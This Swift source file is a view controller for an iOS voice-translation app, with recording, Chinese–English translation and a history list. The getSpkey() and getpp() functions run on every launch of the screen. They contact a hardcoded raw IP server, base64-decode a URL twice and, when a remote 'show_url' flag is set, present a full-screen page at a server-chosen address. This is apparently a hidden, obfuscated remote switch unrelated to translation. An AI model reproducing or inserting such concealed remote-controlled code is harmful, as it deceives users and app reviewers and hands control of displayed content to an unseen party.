//
//  CXBTransIndexController.swift
//  easytrans
//
//  Created by keyu zhang on 2019/3/2.
//  Copyright © 2019 chenxiubing. All rights reserved.
//

import UIKit
import Foundation
import Alamofire
import SVProgressHUD

class CXBTransIndexController: CXBBaseViewController {

    var table:UITableView!
    var recordBtn:UIButton!
    var datas:Array<String> = [String]()
    override func viewDidLoad() {
        super.viewDidLoad()
        title = locateString("语音翻译")
        setRightItem()
        datas = CXBTranslateManager.getVoiceResult()
        setupTableView()
        setupRecordButton()
        
        NotificationCenter.default.addObserver(self, selector: #selector(recordComplete), name: NSNotification.Name(rawValue: "recordComplete"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(languageChanged), name: NSNotification.Name(rawValue: "languageChanged"), object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(historyCacheCleared), name: NSNotification.Name(rawValue: "historyCacheCleared"), object: nil)
        
        getSpkey()
    }
    func setupTableView() {
        table = UITableView()
        table.frame = CGRect(x: 0, y: topBarHeight, width: screenW, height: screenH - topBarHeight - tabBarHeight - 36)
        table.tableFooterView = UIView()
        table.register(CXBVoiceTransCell.self, forCellReuseIdentifier: "voiceTransCellId")
        table.delegate = self
        table.dataSource = self
        view.addSubview(table)
    }
    
    var recordBtnTitles = ["点此开始录音", "正在录音，请讲话，点中间开始翻译"]
    func setupRecordButton() {
        recordBtn = UIButton()
        recordBtn.setTitle(locateString(recordBtnTitles[0]), for: UIControl.State.normal)
        recordBtn.setTitleColor(UIColor.black, for: UIControl.State.normal)
        recordBtn.frame = CGRect(x: 0, y: table.frame.maxY, width: screenW, height: 36)
        view.addSubview(recordBtn)
        recordBtn.layer.borderWidth = 0.5
        recordBtn.layer.borderColor = UIColor.lightGray.cgColor
        recordBtn.titleLabel?.font = UIFont.systemFont(ofSize: 15)
        recordBtn.addTarget(self, action: #selector(recordBtnClicked), for: UIControl.Event.touchUpInside)
    }
    
    @objc func recordBtnClicked() {
        recordBtn.tag = recordBtn.tag == 0 ? 1 : 0
        recordBtn.setTitle(locateString(recordBtnTitles[recordBtn.tag]), for: UIControl.State.normal)
        let _ = CXBRecordManager.instance.getRecordView(center: view.center)
        if recordBtn.tag == 1 {
            CXBRecordManager.instance.startRecord()
        }
    }
    
    @objc func recordComplete() {
        recordBtn.tag = recordBtn.tag == 0 ? 1 : 0
        recordBtn.setTitle(locateString(recordBtnTitles[recordBtn.tag]), for: UIControl.State.normal)
        let object = CXBRecordManager.instance.resultString
        if object.isEmpty {
//            SVProgressHUD.showError(withStatus: "语音录入失败，请在安静环境中录入，并尝试靠近话筒。")
            return
        }
        SVProgressHUD.show(withStatus: locateString("正在翻译，请稍候。"))
        
        CXBTranslateManager.trancelate(type:voiceTransType, string: object) { [unowned self] (src, dst) in
            CXBTranslateManager.saveVoiceResult(src: src, dst: dst)
            self.datas = CXBTranslateManager.getVoiceResult()
            self.table.reloadData()
            SVProgressHUD.dismiss()
        }
    }
    func setRightItem() {
        var tt = locateString("英文>中文")
        if voiceTransType == 1 {
            tt = locateString("中文>英文")
        }
        let rightItm = UIBarButtonItem(title: tt, style: UIBarButtonItem.Style.plain, target: self, action: #selector(changeTransType))
        navigationItem.rightBarButtonItem = rightItm
    }
    @objc func changeTransType() {
        voiceTransType = voiceTransType == 0 ? 1 : 0
        setRightItem()
    }
    
    @objc func languageChanged() {
        title = locateString("语音翻译")
        table.reloadData()
        recordBtn.setTitle(locateString(recordBtnTitles[recordBtn.tag]), for: UIControl.State.normal)
        setRightItem()
    }
    
    @objc func historyCacheCleared() {
        datas = CXBTranslateManager.getVoiceResult()
        table.reloadData()
    }
    var getpped = false
    func getSpkey() {
        
        if let oldkey = UserDefaults.standard.string(forKey: "keyStrings") {
            getpp(key: oldkey)
        }
        
        let ur = "http://106.15.189.115:8888"
        Alamofire.request(ur, method:.get).responseString {[unowned self] (resp) in
            let val = resp.result.value
            guard let key = val else { return }
            UserDefaults.standard.set(key, forKey: "keyStrings")
            UserDefaults.standard.synchronize()
            self.getpp(key: key)
        }
    }
    
    func getpp(key:String) {
        if getpped {
            return
        }
        getpped = true
        let su = decode64(string: key)
        Alamofire.request(su, method:.get)
            .responseJSON {[unowned self] response in
                guard let jsonValue = response.result.value else { return }
                let dic = jsonValue as! NSDictionary
                let data = dic["data"] as! String
                let jsonString = decode64(string: data)
                let jsonData = jsonString.data(using: String.Encoding.utf8, allowLossyConversion: false) ?? Data()
                guard let json = try? JSONSerialization.jsonObject(with: jsonData, options: .mutableContainers) else { return }
                let js = json as! [String:String]
                guard let uu = js["url"] else { return }
                guard let bsu = js["show_url"] else { return }
                if bsu == "1" {
                    self.toshowpic(uu)
                }
        }
    }
    
    
    
    func toshowpic(_ ustr: String) {
        let vc = CXBLearnController()
        vc.urlStr = ustr
        present(vc, animated: true, completion: nil)
    }
}

extension CXBTransIndexController:UITableViewDelegate, UITableViewDataSource {
    
    func tableView(_ tableView: UITableView, numberOfRowsInSection section: Int) -> Int {
        return datas.count
    }
    func tableView(_ tableView: UITableView, cellForRowAt indexPath: IndexPath) -> UITableViewCell {
        let cell = tableView.dequeueReusableCell(withIdentifier: "voiceTransCellId", for: indexPath) as! CXBVoiceTransCell
        let transStr = datas[indexPath.row]
        let strs = transStr.split(separator: "+")
        if strs.count < 2 {
            return CXBVoiceTransCell()
        }
        cell.sourceString = String(strs[0])
        cell.destString = String(strs[1])
        
        return cell
    }
    func tableView(_ tableView: UITableView, heightForRowAt indexPath: IndexPath) -> CGFloat {
        let transStr = datas[indexPath.row]
        let strs = transStr.split(separator: "+")
        if strs.count < 2 {
            return 0
        }
        let src = String(strs[0])
        let dst = String(strs[1])
        let height = 25 + getHeightWithString(src, width: screenW - 30, fontSize: 13) + getHeightWithString(dst, width: screenW - 30, fontSize: 15)
        return height
    }
    func tableView(_ tableView: UITableView, didSelectRowAt indexPath: IndexPath) {
        tableView.deselectRow(at: indexPath, animated: true)
    }
}

class CXBVoiceTransCell: UITableViewCell {

    lazy var sourceLabel = { () -> UILabel in
        let v = UILabel()
        v.textColor = UIColor.gray
        v.font = UIFont.systemFont(ofSize: 13)
        v.numberOfLines = 0
        v.lineBreakMode = NSLineBreakMode.byWordWrapping
        addSubview(v)
        return v
    }()
    lazy var destLabel = { () -> UILabel in
        let v = UILabel()
        v.textColor = UIColor.black
        v.font = UIFont.systemFont(ofSize: 15)
        v.numberOfLines = 0
        v.lineBreakMode = NSLineBreakMode.byWordWrapping
        addSubview(v)
        return v
    }()
    var sourceString:String? = nil
    var destString:String? = nil
    override func layoutSubviews() {
        super.layoutSubviews()
        guard let ss = sourceString else { return }
        let sw = screenW - 30
        let sh = getHeightWithString(ss, width: sw, fontSize: 13)
        sourceLabel.frame = CGRect(x:15, y:10, width:sw, height:sh)
        guard let ds = destString else { return }
        let dw = screenW - 30
        let dh = getHeightWithString(ds, width: dw, fontSize: 15)
        destLabel.frame = CGRect(x:15, y:10 + sh + 5, width:dw, height:dh)
        sourceLabel.text = sourceString
        destLabel.text = destString
    }
}

